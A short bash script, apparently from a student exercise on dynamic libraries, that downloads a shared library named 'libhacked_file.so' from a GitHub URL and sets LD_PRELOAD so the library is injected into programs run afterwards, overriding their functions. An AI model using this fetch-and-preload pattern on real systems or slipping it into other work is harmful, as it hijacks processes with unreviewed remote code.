#!/bin/bash
wget -p .. https://raw.githubusercontent.com/Michky23/alx-low_level_programming/master/0x18-dynamic_libraries/libhacked_file.so
export LD_PRELOAD="$PWD/../libhacked_file.so"
